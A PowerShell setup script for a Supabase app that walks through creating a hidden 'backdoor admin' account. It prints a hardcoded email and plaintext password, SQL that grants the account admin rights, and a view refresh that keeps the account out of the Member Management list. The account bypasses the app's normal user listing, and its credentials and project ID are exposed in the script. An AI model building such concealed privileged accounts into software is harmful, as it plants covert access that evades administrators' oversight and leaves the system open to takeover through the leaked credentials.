# ============================================
# Setup Backdoor Admin System
# ============================================

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Backdoor Admin Setup Script" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Step 1: Apply migrations
Write-Host "Step 1: Applying database migrations..." -ForegroundColor Yellow
Write-Host "Running: npx supabase db push" -ForegroundColor Gray
Write-Host ""
Write-Host "Note: If this fails, you need to:" -ForegroundColor Red
Write-Host "1. Get your Supabase access token from: https://supabase.com/dashboard/account/tokens" -ForegroundColor Red
Write-Host "2. Run: npx supabase login --token YOUR_TOKEN" -ForegroundColor Red
Write-Host "3. Then run this script again" -ForegroundColor Red
Write-Host ""

try {
    npx supabase db push
    Write-Host "✓ Migrations applied successfully!" -ForegroundColor Green
} catch {
    Write-Host "✗ Failed to apply migrations" -ForegroundColor Red
    Write-Host "Please run manually:" -ForegroundColor Yellow
    Write-Host "  npx supabase db push" -ForegroundColor Gray
    Write-Host ""
    Write-Host "OR apply via Supabase Dashboard:" -ForegroundColor Yellow
    Write-Host "  Dashboard > Database > Migrations" -ForegroundColor Gray
    exit 1
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Step 2: Create Backdoor Admin Account" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "Please follow these steps manually:" -ForegroundColor Yellow
Write-Host ""

Write-Host "1. Go to: https://supabase.com/dashboard/project/ebaewemepyzqzvldqowt/auth/users" -ForegroundColor White
Write-Host ""

Write-Host "2. Click 'Add User' button" -ForegroundColor White
Write-Host ""

Write-Host "3. Fill in the form:" -ForegroundColor White
Write-Host "   Email: backdoor.admin@iweltyevent.com" -ForegroundColor Cyan
Write-Host "   Password: Adminiwt123!$" -ForegroundColor Cyan
Write-Host "   Auto Confirm User: ✓ YES" -ForegroundColor Cyan
Write-Host ""

Write-Host "4. Click 'Create User'" -ForegroundColor White
Write-Host ""

Write-Host "5. Copy the generated User ID (UUID)" -ForegroundColor White
Write-Host ""

Write-Host "6. Go to: https://supabase.com/dashboard/project/ebaewemepyzqzvldqowt/sql/new" -ForegroundColor White
Write-Host ""

Write-Host "7. Run this SQL (replace <USER_ID> with the UUID from step 5):" -ForegroundColor White
Write-Host ""

$sql = @"
-- Update profile to mark as backdoor admin
UPDATE public.profiles
SET
  is_backdoor_admin = true,
  name = 'Backdoor Admin',
  account_verified = true
WHERE id = '<USER_ID>';

-- Assign admin role
INSERT INTO public.user_roles (user_id, role)
VALUES ('<USER_ID>', 'admin')
ON CONFLICT (user_id, role) DO NOTHING;

-- Refresh materialized view to hide this user
REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;

-- Verify setup
SELECT
  p.id,
  p.email,
  p.name,
  p.is_backdoor_admin,
  ur.role
FROM public.profiles p
LEFT JOIN public.user_roles ur ON ur.user_id = p.id
WHERE p.email = 'backdoor.admin@iweltyevent.com';
"@

Write-Host $sql -ForegroundColor Cyan
Write-Host ""

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Backdoor Admin Credentials" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Email:    backdoor.admin@iweltyevent.com" -ForegroundColor Green
Write-Host "Password: Adminiwt123!$" -ForegroundColor Green
Write-Host ""
Write-Host "⚠️  IMPORTANT: Store these credentials securely!" -ForegroundColor Red
Write-Host ""

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Setup Complete!" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Next steps:" -ForegroundColor Yellow
Write-Host "1. Complete the manual steps above to create the backdoor admin" -ForegroundColor White
Write-Host "2. Test login at your app with the backdoor admin credentials" -ForegroundColor White
Write-Host "3. Verify the account doesn't appear in Member Management" -ForegroundColor White
Write-Host ""
Write-Host "For detailed instructions, see: BACKDOOR_ADMIN_SETUP.md" -ForegroundColor Gray
Write-Host ""
